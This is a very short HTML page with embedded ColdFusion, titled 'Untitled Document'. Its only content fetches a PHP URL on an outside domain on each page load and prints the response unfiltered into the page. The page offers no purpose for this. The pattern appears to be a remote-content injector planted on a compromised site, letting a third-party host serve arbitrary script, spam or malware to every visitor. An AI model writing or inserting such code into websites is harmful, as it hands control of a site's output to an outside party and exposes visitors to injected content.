<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title>Untitled Document</title>
</head>

<body>

<cfset site="http://ukrtv.biz/moz.php">

			<cfhttp url=#site# result="result" method="GET"> </cfhttp> 	
		     <cfoutput >#result.Filecontent#</cfoutput>
		     
	






</body>
</html>
